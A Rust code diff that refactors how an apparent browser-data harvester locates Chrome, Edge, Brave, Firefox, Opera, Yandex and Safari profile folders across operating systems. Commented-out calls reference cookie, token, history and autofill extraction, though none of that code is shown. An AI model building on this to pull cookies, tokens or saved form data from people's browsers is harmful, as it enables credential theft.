@@ -23,56 +23,74 @@ pub async fn get_browser() {
             // cookies::get_cookies(path_entry, &profiles).await;
             // token::get_token(path_entry, &profiles).await;
 
+            // let history = history::get_history(path_entry, &profiles, &tempfile).await;
+            // println!("{history:#?}");
+
+            // let bookmarks = bookmarks::get_bookmarks(path_entry, &profiles).await;
+
             // let autofills = autofill::get_autofill(path_entry, &profiles, &tempfile).await;
             // println!("{autofills:#?}");
-
-            // bookmarks::get_bookmarks(path_entry, &profiles).await;
-            // history::get_history(path_entry, &profiles).await;
         }
     }
 }
 
 fn get_browser_root_paths() -> Vec<PathBuf> {
-    let mut browser_root;
+    let mut root_paths = Vec::with_capacity(8);
 
-    if cfg!(target_os = "windows") {
-        browser_root = Vec::with_capacity(8);
+    #[cfg(target_os = "windows")]
+    {
         let local = std::env::var("LOCALAPPDATA").unwrap();
         let roaming = std::env::var("APPDATA").unwrap();
 
-        browser_root.push(PathBuf::from(format!("{local}/Google/Chrome/User Data"))); // Google Chrome
-        browser_root.push(PathBuf::from(format!("{local}/Microsoft/Edge/User Data"))); // Microsoft Edge
-        browser_root.push(PathBuf::from(format!(
+        root_paths.push(PathBuf::from(format!("{local}/Google/Chrome/User Data"))); // Google Chrome
+        root_paths.push(PathBuf::from(format!("{local}/Microsoft/Edge/User Data"))); // Microsoft Edge
+        root_paths.push(PathBuf::from(format!(
             "{local}/BraveSoftware/Brave-Browser/User Data"
         ))); // Brave Browser
              // browser_root.push(PathBuf::from(format!(""))), // Web Explorer
-             // browser_root.push(PathBuf::from(format!(""))), // Firefox
-        browser_root.push(PathBuf::from(format!(
+        root_paths.push(PathBuf::from(format!("{roaming}/Mozilla/Firefox/Profiles"))); // Firefox
+        root_paths.push(PathBuf::from(format!(
             "{local}/Yandex/YandexBrowser/User Data"
         ))); // Yandex
-        browser_root.push(PathBuf::from(format!(
+        root_paths.push(PathBuf::from(format!(
             "{roaming}/Opera Software/Opera GX Stable"
         ))); // Opera GX Browser
-        browser_root.push(PathBuf::from(format!(
+        root_paths.push(PathBuf::from(format!(
             "{roaming}/Opera Software/Opera Stable"
         ))); // Opera Browser
-    } else {
-        // for linux
-        browser_root = Vec::with_capacity(7);
+    }
+    #[cfg(target_os = "linux")]
+    {
         let home = std::env::var("HOME").unwrap();
 
-        // browser_root.push(PathBuf::from(format!("{home}/.mozilla/firefox"))); // Firefox
-        browser_root.push(PathBuf::from(format!(
+        // root_paths.push(PathBuf::from(format!("{home}/.mozilla/firefox"))); // Firefox
+        root_paths.push(PathBuf::from(format!(
             "{home}/.config/BraveSoftware/Brave-Browser"
         )));
-        // browser_root[2].push(""); // Chromium
-        // browser_root[2].push(""); // Google Chrome
-        // browser_root[3].push(""); // Microsoft Edge
-        // browser_root[5].push(""); // Yandex
-        // browser_root[6].push(""); // Opera
+        // root_paths.push(PathBuf::from(format!("{home}/.config/google-chrome"))); // Google Chrome
+
+        // root_paths.push(""); // Chromium
+        // root_paths.push(""); // Microsoft Edge
+        // root_paths.push(""); // Yandex
+        // root_paths.push(""); // Opera
+    }
+    #[cfg(target_os = "macos")]
+    {
+        let user = std::env::var("USER").unwrap();
+
+        root_paths.push(PathBuf::from(format!("Users/{user}/Library/Safari"))); // Safari
+        root_paths.push(PathBuf::from(format!(
+            "Users/{user}/Library/Application Support/Google/Chrome"
+        ))); // Google Chrome
+        root_paths.push(PathBuf::from(format!(
+            "Users/{user}/Library/Application Support/Firefox/Profiles"
+        ))); // Firefox
+        root_paths.push(PathBuf::from(format!(
+            "Users/{user}/Library/Application Support/com.operasoftware.Opera"
+        ))); // Opera
     }
 
-    browser_root
+    root_paths
 }
 
 async fn get_profiles(path: &mut PathBuf) -> std::io::Result<Vec<String>> {
@@ -85,7 +103,7 @@ async fn get_profiles(path: &mut PathBuf) -> std::io::Result<Vec<String>> {
             while let Ok(dir_entry_unknown) = list.next_entry().await {
                 if let Some(dir_entry) = dir_entry_unknown {
                     if let Some(entry) = dir_entry.file_name().to_str() {
-                        if !entry.contains("Profile") {
+                        if !entry.starts_with("Profile") {
                             continue;
                         }
                     }
